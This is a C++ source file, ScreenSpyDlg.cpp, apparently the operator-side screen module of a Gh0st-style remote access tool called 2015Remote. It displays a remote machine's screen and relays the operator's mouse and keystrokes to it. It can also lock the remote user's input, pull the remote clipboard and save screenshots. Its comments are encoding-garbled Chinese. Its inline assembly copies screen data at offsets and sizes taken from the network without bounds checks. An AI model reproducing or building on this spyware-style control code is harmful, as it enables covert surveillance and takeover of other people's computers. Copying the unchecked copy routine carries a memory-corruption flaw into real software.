// ScreenSpyDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "2015Remote.h"
#include "ScreenSpyDlg.h"
#include "afxdialogex.h"
#include <imm.h>


// CScreenSpyDlg �Ի���

enum
{
	IDM_CONTROL = 0x1010,
	IDM_FULLSCREEN, 
	IDM_SEND_CTRL_ALT_DEL,
	IDM_TRACE_CURSOR,	// ������ʾԶ�����
	IDM_BLOCK_INPUT,	// ����Զ�̼��������
	IDM_SAVEDIB,		// ����ͼƬ
	IDM_GET_CLIPBOARD,	// ��ȡ������
	IDM_SET_CLIPBOARD,	// ���ü�����
};

IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialog)

#define ALGORITHM_DIFF 1

CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialog(CScreenSpyDlg::IDD, Parent)
{
	ImmDisableIME(0);// �������뷨
	m_bFullScreen = FALSE;

	m_iocpServer	= IOCPServer;
	m_ContextObject	= ContextObject;

	CHAR szFullPath[MAX_PATH];
	GetSystemDirectory(szFullPath, MAX_PATH);
	lstrcat(szFullPath, "\\shell32.dll");  //ͼ��
	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szFullPath, 17);
	m_hCursor = LoadCursor(AfxGetApp()->m_hInstance, MAKEINTRESOURCE(IDC_ARROWS));

	sockaddr_in  ClientAddr;
	memset(&ClientAddr, 0, sizeof(ClientAddr));
	int ulClientAddrLen = sizeof(sockaddr_in);
	BOOL bOk = getpeername(m_ContextObject->sClientSocket,(SOCKADDR*)&ClientAddr, &ulClientAddrLen);

	m_strClientIP = bOk != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "";

	m_bIsFirst = TRUE;
	m_ulHScrollPos = 0;
	m_ulVScrollPos = 0;

	ULONG	ulBitmapInforLength = m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1;
	m_BitmapInfor_Full = (BITMAPINFO *) new BYTE[ulBitmapInforLength];

	memcpy(m_BitmapInfor_Full, m_ContextObject->InDeCompressedBuffer.GetBuffer(1), ulBitmapInforLength);

	m_bIsCtrl = FALSE;
	m_bIsTraceCursor = FALSE;
}


VOID CScreenSpyDlg::SendNext(void)
{
	BYTE	bToken = COMMAND_NEXT;
	m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, 1);
}


CScreenSpyDlg::~CScreenSpyDlg()
{
	if (m_BitmapInfor_Full!=NULL)
	{
		delete m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}

	::ReleaseDC(m_hWnd, m_hFullDC);   //GetDC
	::DeleteDC(m_hFullMemDC);                //Createƥ���ڴ�DC

	::DeleteObject(m_BitmapHandle);
	if (m_BitmapData_Full!=NULL)
	{
		m_BitmapData_Full = NULL;
	}
}

void CScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
	ON_WM_HSCROLL()
	ON_WM_VSCROLL()
	ON_WM_LBUTTONDOWN()
	ON_WM_LBUTTONUP()
	ON_WM_MOUSEWHEEL()
	ON_WM_MOUSEMOVE()
	ON_WM_KILLFOCUS()
	ON_WM_SIZE()
END_MESSAGE_MAP()


// CScreenSpyDlg ��Ϣ�������


BOOL CScreenSpyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	SetIcon(m_hIcon,FALSE);

	CString strString;
	strString.Format("%s - Զ��������� %d��%d", m_strClientIP, 
		m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);
	SetWindowText(strString);

	m_hFullDC = ::GetDC(m_hWnd);
	m_hFullMemDC = CreateCompatibleDC(m_hFullDC);
	m_BitmapHandle = CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, 
		DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);   //����Ӧ�ó������ֱ��д��ġ����豸�޹ص�λͼ

	SelectObject(m_hFullMemDC, m_BitmapHandle);//��һ����ָ�����豸�����Ļ���

	SetScrollRange(SB_HORZ, 0, m_BitmapInfor_Full->bmiHeader.biWidth);  //ָ����������Χ����Сֵ�����ֵ
	SetScrollRange(SB_VERT, 0, m_BitmapInfor_Full->bmiHeader.biHeight);//1366  768

	CMenu* SysMenu = GetSystemMenu(FALSE);
	if (SysMenu != NULL)
	{
		SysMenu->AppendMenu(MF_SEPARATOR);
		SysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "������Ļ(&Y)");
		SysMenu->AppendMenu(MF_STRING, IDM_FULLSCREEN, "ȫ��(&F)");
		SysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "���ٱ��ض����(&T)");
		SysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "�������ض����ͼ���(&L)");
		SysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "�������(&S)");
		SysMenu->AppendMenu(MF_SEPARATOR);
		SysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "��ȡ������(&R)");
		SysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "���ü�����(&L)");
		SysMenu->AppendMenu(MF_SEPARATOR);
	}

	m_bIsCtrl = FALSE;   //���ǿ���
	m_bIsTraceCursor = FALSE;  //���Ǹ���
	m_ClientCursorPos.x = 0;
	m_ClientCursorPos.y = 0;
	m_bCursorIndex = 0;

	SendNext();

	return TRUE;
}


VOID CScreenSpyDlg::OnClose()
{
#if CLOSE_DELETE_DLG
	m_ContextObject->v1 = 0;
#endif
	CancelIo((HANDLE)m_ContextObject->sClientSocket);
	closesocket(m_ContextObject->sClientSocket);

	CDialog::OnClose();
#if CLOSE_DELETE_DLG
	delete this;
#endif
}


VOID CScreenSpyDlg::OnReceiveComplete()
{
	assert (m_ContextObject);

	switch(m_ContextObject->InDeCompressedBuffer.GetBuffer()[0])
	{
	case TOKEN_FIRSTSCREEN:
		{
			DrawFirstScreen();
			break;
		}
	case TOKEN_NEXTSCREEN:
		{
			if (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[1]==ALGORITHM_DIFF)
			{
				DrawNextScreenDiff();
			}
			break;
		}
	case TOKEN_CLIPBOARD_TEXT:
		{
			UpdateServerClipboard((char*)m_ContextObject->InDeCompressedBuffer.GetBuffer(1), 
				m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1);
			break;
		}
	}
}

VOID CScreenSpyDlg::DrawFirstScreen(void)
{
	m_bIsFirst = FALSE;

	//�õ����ض˷��������� ������������HBITMAP�Ļ������У�����һ��ͼ��ͳ�����
	memcpy(m_BitmapData_Full, m_ContextObject->InDeCompressedBuffer.GetBuffer(1), m_BitmapInfor_Full->bmiHeader.biSizeImage);

	PostMessage(WM_PAINT);//����WM_PAINT��Ϣ
}

VOID CScreenSpyDlg::DrawNextScreenDiff(void)
{
	//�ú�������ֱ�ӻ�����Ļ�ϣ����Ǹ���һ�±仯���ֵ���Ļ����Ȼ�����
	//OnPaint����ȥ
	//��������Ƿ��ƶ�����Ļ�Ƿ�仯�ж��Ƿ��ػ���꣬��ֹ�����˸
	BOOL	bChange = FALSE;
	ULONG	ulHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // ��ʶ + �㷨 + ��� λ�� + �����������
	LPVOID	FirstScreenData = m_BitmapData_Full;
	LPVOID	NextScreenData = m_ContextObject->InDeCompressedBuffer.GetBuffer(ulHeadLength);
	ULONG	NextScreenLength = m_ContextObject->InDeCompressedBuffer.GetBufferLength() - ulHeadLength;

	POINT	OldClientCursorPos;
	memcpy(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT));
	memcpy(&m_ClientCursorPos, m_ContextObject->InDeCompressedBuffer.GetBuffer(2), sizeof(POINT));

	// ����ƶ���
	if (memcmp(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT)) != 0)
	{
		bChange = TRUE;
	}

	// ������ͷ����仯
	BYTE bOldCursorIndex = m_bCursorIndex;
	m_bCursorIndex = m_ContextObject->InDeCompressedBuffer.GetBuffer(2+sizeof(POINT))[0];
	if (bOldCursorIndex != m_bCursorIndex)
	{
		bChange = TRUE;
		if (m_bIsCtrl && !m_bIsTraceCursor)//�滻ָ�������������WNDCLASSEX�ṹ
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
	}

	// ��Ļ�Ƿ�仯
	if (NextScreenLength > 0) 
	{
		bChange = TRUE;
	}

	//lodsdָ���ESIָ����ڴ�λ��4���ֽ����ݷ���EAX�в�������4
	//movsbָ���ֽڴ������ݣ�ͨ��SI��DI�������Ĵ��������ַ�����Դ��ַ��Ŀ���ַ
	//m_rectBuffer [0002 esi0002 esi000A 000C]     [][]edi[][][][][][][][][][][][][][][][][]
	__asm
	{
		mov ebx, [NextScreenLength]   //ebx 16  
		mov esi, [NextScreenData]  
		jmp	CopyEnd
CopyNextBlock:
		mov edi, [FirstScreenData]
		lodsd	            // ��lpNextScreen�ĵ�һ��˫�ֽڣ��ŵ�eax��,����DIB�иı������ƫ��
			add edi, eax	// lpFirstScreenƫ��eax	
			lodsd           // ��lpNextScreen����һ��˫�ֽڣ��ŵ�eax��, ���Ǹı�����Ĵ�С
			mov ecx, eax
			sub ebx, 8      // ebx ��ȥ ����dword
			sub ebx, ecx    // ebx ��ȥDIB���ݵĴ�С
			rep movsb
CopyEnd:
		cmp ebx, 0 // �Ƿ�д�����
			jnz CopyNextBlock
	}

	if (bChange)
	{
		PostMessage(WM_PAINT);
	}
}


void CScreenSpyDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting

	if (m_bIsFirst)
	{
		DrawTipString("��ȴ�......");
		return;
	}

	BitBlt(m_hFullDC,0,0,
		m_BitmapInfor_Full->bmiHeader.biWidth, 
		m_BitmapInfor_Full->bmiHeader.biHeight,
		m_hFullMemDC,
		m_ulHScrollPos,
		m_ulVScrollPos,
		SRCCOPY
		);

	if (m_bIsTraceCursor)
		DrawIconEx(
		m_hFullDC,								
		m_ClientCursorPos.x  - m_ulHScrollPos, 
		m_ClientCursorPos.y  - m_ulVScrollPos,
		m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),
		0,0,										
		0,										
		NULL,									
		DI_NORMAL | DI_COMPAT					
		);
}

VOID CScreenSpyDlg::DrawTipString(CString strString)
{
	RECT Rect;
	GetClientRect(&Rect);
	//COLORREF�������һ��RGB��ɫ
	COLORREF  BackgroundColor = RGB(0x00, 0x00, 0x00);	
	COLORREF  OldBackgroundColor  = SetBkColor(m_hFullDC, BackgroundColor);
	COLORREF  OldTextColor = SetTextColor(m_hFullDC, RGB(0xff,0x00,0x00));
	//ExtTextOut���������ṩһ���ɹ�ѡ��ľ��Σ��õ�ǰѡ������塢������ɫ��������ɫ������һ���ַ���
	ExtTextOut(m_hFullDC, 0, 0, ETO_OPAQUE, &Rect, NULL, 0, NULL);

	DrawText (m_hFullDC, strString, -1, &Rect,DT_SINGLELINE | DT_CENTER | DT_VCENTER);

	SetBkColor(m_hFullDC, BackgroundColor);
	SetTextColor(m_hFullDC, OldBackgroundColor);
}


void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	CMenu* SysMenu = GetSystemMenu(FALSE);

	switch (nID)
	{
	case IDM_CONTROL:
		{
			m_bIsCtrl = !m_bIsCtrl;
			SysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);
			break;
		}
	case IDM_FULLSCREEN: // ȫ��
		{
			EnterFullScreen();
			SysMenu->CheckMenuItem(IDM_FULLSCREEN, MF_CHECKED); //�˵���ʽ
			break;
		}
	case IDM_SAVEDIB:    // ���ձ���
		{
			SaveSnapshot();
			break;
		}
	case IDM_TRACE_CURSOR: // ���ٱ��ض����
		{	
			m_bIsTraceCursor = !m_bIsTraceCursor; //�����ڸı�����
			SysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);//�ڲ˵��򹳲���

			// �ػ���������ʾ���
			OnPaint();
			break;
		}
	case IDM_BLOCK_INPUT: // ������������ͼ���
		{
			BOOL bIsChecked = SysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
			SysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

			BYTE	bToken[2];
			bToken[0] = COMMAND_SCREEN_BLOCK_INPUT;
			bToken[1] = !bIsChecked;
			m_iocpServer->OnClientPreSending(m_ContextObject, bToken, sizeof(bToken));
			break;
		}
	case IDM_GET_CLIPBOARD: //��ҪClient�ļ���������
		{
			BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
			m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(bToken));
			break;
		}
	case IDM_SET_CLIPBOARD: //����
		{
			SendServerClipboard();
			break;
		}
	}

	CDialog::OnSysCommand(nID, lParam);
}


BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
{
#define MAKEDWORD(h,l)        (((unsigned long)h << 16) | l) 
	switch (pMsg->message)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_MOUSEMOVE:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MOUSEWHEEL:
		{
			MSG	Msg;
			memcpy(&Msg, pMsg, sizeof(MSG));
			Msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_ulVScrollPos, LOWORD(pMsg->lParam) + m_ulHScrollPos);
			Msg.pt.x += m_ulHScrollPos;
			Msg.pt.y += m_ulVScrollPos;
			SendCommand(&Msg);
		}
		break;
	case WM_KEYDOWN:
	case WM_KEYUP:
	case WM_SYSKEYDOWN:
	case WM_SYSKEYUP:
		if (pMsg->wParam == VK_F11 && LeaveFullScreen()) // F11: �˳�ȫ��
			return TRUE;
		if (pMsg->wParam != VK_LWIN && pMsg->wParam != VK_RWIN)
		{
			MSG	Msg;
			memcpy(&Msg, pMsg, sizeof(MSG));
			Msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_ulVScrollPos, LOWORD(pMsg->lParam) + m_ulHScrollPos);
			Msg.pt.x += m_ulHScrollPos;
			Msg.pt.y += m_ulVScrollPos;
			SendCommand(&Msg);
		}
		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
			return TRUE;// ����Enter��ESC�رնԻ�
		break;
	}

	return CDialog::PreTranslateMessage(pMsg);
}


VOID CScreenSpyDlg::SendCommand(MSG* Msg)
{
	if (!m_bIsCtrl)
		return;

	const int length = sizeof(MSG) + 1;
	BYTE szData[length + 3];
	szData[0] = COMMAND_SCREEN_CONTROL;
	memcpy(szData + 1, Msg, sizeof(MSG));
	szData[length] = 0;
	m_iocpServer->OnClientPreSending(m_ContextObject, szData, length);
}

BOOL CScreenSpyDlg::SaveSnapshot(void)
{
	CString	strFileName = m_strClientIP + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
	CFileDialog Dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "λͼ�ļ�(*.bmp)|*.bmp|", this);
	if(Dlg.DoModal () != IDOK)
		return FALSE;

	BITMAPFILEHEADER	BitMapFileHeader;
	LPBITMAPINFO		BitMapInfor = m_BitmapInfor_Full; //1920 1080  1  0000
	CFile	File;
	if (!File.Open( Dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		return FALSE;
	}

	// BITMAPINFO��С
	//+ (BitMapInfor->bmiHeader.biBitCount > 16 ? 1 : (1 << BitMapInfor->bmiHeader.biBitCount)) * sizeof(RGBQUAD)
	//bmp  fjkdfj  dkfjkdfj [][][][]
	int	nbmiSize = sizeof(BITMAPINFO);

	//Э��  TCP    У��ֵ
	BitMapFileHeader.bfType			= ((WORD) ('M' << 8) | 'B');	
	BitMapFileHeader.bfSize			= BitMapInfor->bmiHeader.biSizeImage + sizeof(BitMapFileHeader);  //8421
	BitMapFileHeader.bfReserved1 	= 0;                                          //8000
	BitMapFileHeader.bfReserved2 	= 0;
	BitMapFileHeader.bfOffBits		= sizeof(BitMapFileHeader) + nbmiSize;

	File.Write(&BitMapFileHeader, sizeof(BitMapFileHeader));
	File.Write(BitMapInfor, nbmiSize);

	File.Write(m_BitmapData_Full, BitMapInfor->bmiHeader.biSizeImage);
	File.Close();

	return true;
}


VOID CScreenSpyDlg::UpdateServerClipboard(char *szBuffer,ULONG ulLength)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hGlobal = GlobalAlloc(GPTR, ulLength);  
	if (hGlobal != NULL) { 

		char*  szClipboardVirtualAddress  = (LPTSTR) GlobalLock(hGlobal); 
		memcpy(szClipboardVirtualAddress,szBuffer,ulLength); 
		GlobalUnlock(hGlobal);         
		SetClipboardData(CF_TEXT, hGlobal); 
		GlobalFree(hGlobal);
	}
	CloseClipboard();
}

VOID CScreenSpyDlg::SendServerClipboard(void)
{
	if (!::OpenClipboard(NULL))  //�򿪼��а��豸
		return;
	HGLOBAL hGlobal = GetClipboardData(CF_TEXT);   //������һ���ڴ�
	if (hGlobal == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	  iPacketLength = GlobalSize(hGlobal) + 1;
	char*   szClipboardVirtualAddress = (LPSTR) GlobalLock(hGlobal);    //���� 
	LPBYTE	szBuffer = new BYTE[iPacketLength];

	szBuffer[0] = COMMAND_SCREEN_SET_CLIPBOARD;
	memcpy(szBuffer + 1, szClipboardVirtualAddress, iPacketLength - 1);
	::GlobalUnlock(hGlobal); 
	::CloseClipboard();
	m_iocpServer->OnClientPreSending(m_ContextObject,(PBYTE)szBuffer, iPacketLength);
	delete[] szBuffer;
}


void CScreenSpyDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	SCROLLINFO si = {sizeof(si)};
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_HORZ, &si);

	int nPrevPos = si.nPos;
	switch(nSBCode)
	{
	case SB_LEFT:
		si.nPos = si.nMin;
		break;
	case SB_RIGHT:
		si.nPos = si.nMax;
		break;
	case SB_LINELEFT:
		si.nPos -= 8;
		break;
	case SB_LINERIGHT:
		si.nPos += 8;
		break;
	case SB_PAGELEFT:
		si.nPos -= si.nPage;
		break;
	case SB_PAGERIGHT:
		si.nPos += si.nPage;
		break;
	case SB_THUMBTRACK:
		si.nPos = si.nTrackPos;
		break;
	default:
		break;
	}
	si.fMask = SIF_POS;
	SetScrollInfo(SB_HORZ, &si, TRUE);
	if (si.nPos != nPrevPos)
	{
		m_ulHScrollPos += si.nPos - nPrevPos;
		ScrollWindow(nPrevPos - si.nPos, 0, NULL, NULL);
	}

	CDialog::OnHScroll(nSBCode, nPrevPos, pScrollBar);
}


void CScreenSpyDlg::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	SCROLLINFO si = {sizeof(si)};
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_VERT, &si);

	int nPrevPos = si.nPos;
	switch(nSBCode)
	{
	case SB_TOP:
		si.nPos = si.nMin;
		break;
	case SB_BOTTOM:
		si.nPos = si.nMax;
		break;
	case SB_LINEUP:
		si.nPos -= 8;
		break;
	case SB_LINEDOWN:
		si.nPos += 8;
		break;
	case SB_PAGEUP:
		si.nPos -= si.nPage;
		break;
	case SB_PAGEDOWN:
		si.nPos += si.nPage;
		break;
	case SB_THUMBTRACK:
		si.nPos = si.nTrackPos;
		break;
	default:
		break;
	}
	si.fMask = SIF_POS;
	SetScrollInfo(SB_VERT, &si, TRUE);
	if (si.nPos != nPrevPos)
	{
		m_ulVScrollPos += si.nPos - nPrevPos;
		ScrollWindow(0, nPrevPos - si.nPos, NULL, NULL);
	}

	CDialog::OnVScroll(nSBCode, nPrevPos, pScrollBar);
}


void CScreenSpyDlg::EnterFullScreen()
{
	if (!m_bFullScreen)
	{
		//get current system resolution
		int g_iCurScreenWidth = GetSystemMetrics(SM_CXSCREEN);
		int g_iCurScreenHeight = GetSystemMetrics(SM_CYSCREEN);

		//for full screen while backplay
		GetWindowPlacement(&m_struOldWndpl);

		CRect rectWholeDlg;//entire client(including title bar)
		CRect rectClient;//client area(not including title bar)
		CRect rectFullScreen;
		GetWindowRect(&rectWholeDlg);
		RepositionBars(0, 0xffff, AFX_IDW_PANE_FIRST, reposQuery, &rectClient);
		ClientToScreen(&rectClient);

		rectFullScreen.left = rectWholeDlg.left-rectClient.left;
		rectFullScreen.top = rectWholeDlg.top-rectClient.top;
		rectFullScreen.right = rectWholeDlg.right+g_iCurScreenWidth - rectClient.right;
		rectFullScreen.bottom = rectWholeDlg.bottom+g_iCurScreenHeight - rectClient.bottom;
		//enter into full screen;
		WINDOWPLACEMENT struWndpl;
		struWndpl.length = sizeof(WINDOWPLACEMENT);
		struWndpl.flags = 0;
		struWndpl.showCmd = SW_SHOWNORMAL;
		struWndpl.rcNormalPosition = rectFullScreen;
		SetWindowPlacement(&struWndpl);
		m_bFullScreen = true;
	}
}

// ȫ���˳��ɹ��򷵻�true
bool CScreenSpyDlg::LeaveFullScreen()
{
	if (m_bFullScreen)
	{
		SetWindowPlacement(&m_struOldWndpl);
		CMenu *SysMenu = GetSystemMenu(FALSE);
		SysMenu->CheckMenuItem(IDM_FULLSCREEN, MF_UNCHECKED); //�˵���ʽ
		m_bFullScreen = false;
		return true;
	}
	return false;
}

void CScreenSpyDlg::OnLButtonDown(UINT nFlags, CPoint point)
{
	CDialog::OnLButtonDown(nFlags, point);
}


void CScreenSpyDlg::OnLButtonUp(UINT nFlags, CPoint point)
{
	CDialog::OnLButtonUp(nFlags, point);
}


BOOL CScreenSpyDlg::OnMouseWheel(UINT nFlags, short zDelta, CPoint pt)
{
	return CDialog::OnMouseWheel(nFlags, zDelta, pt);
}


void CScreenSpyDlg::OnMouseMove(UINT nFlags, CPoint point)
{
	CDialog::OnMouseMove(nFlags, point);
}


void CScreenSpyDlg::OnKillFocus(CWnd* pNewWnd)
{
	CDialog::OnKillFocus(pNewWnd);
}


void CScreenSpyDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
}
